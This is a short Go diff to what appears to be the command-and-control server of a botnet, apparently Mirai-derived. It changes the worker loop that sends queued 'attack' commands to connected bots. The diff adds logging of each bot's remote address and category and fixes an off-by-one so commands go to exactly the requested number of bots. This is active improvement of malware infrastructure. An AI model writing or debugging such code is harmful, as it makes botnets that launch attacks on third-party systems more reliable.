@@ -93,22 +93,27 @@ func (this *ClientList) worker() {
             break
         case atk := <-this.atkQueue:
             if atk.count == -1 {
+                fmt.Printf("[CMD] Sending command to ALL bots (category: %s)\n", atk.botCata)
                 for _,v := range this.clients {
                     if atk.botCata == "" || atk.botCata == v.source {
+                        fmt.Printf("[CMD] -> Bot %s (%s)\n", v.conn.RemoteAddr(), v.source)
                         v.QueueBuf(atk.buf)
                     }
                 }
             } else {
                 var count int
+                fmt.Printf("[CMD] Sending command to %d bots (category: %s)\n", atk.count, atk.botCata)
                 for _, v := range this.clients {
-                    if count > atk.count {
+                    if count >= atk.count {
                         break
                     }
                     if atk.botCata == "" || atk.botCata == v.source {
+                        fmt.Printf("[CMD] -> Bot %s (%s) [%d/%d]\n", v.conn.RemoteAddr(), v.source, count+1, atk.count)
                         v.QueueBuf(atk.buf)
                         count++
                     }
                 }
+                fmt.Printf("[CMD] Sent to %d bots total\n", count)
             }
             break
         case <-this.cntView:
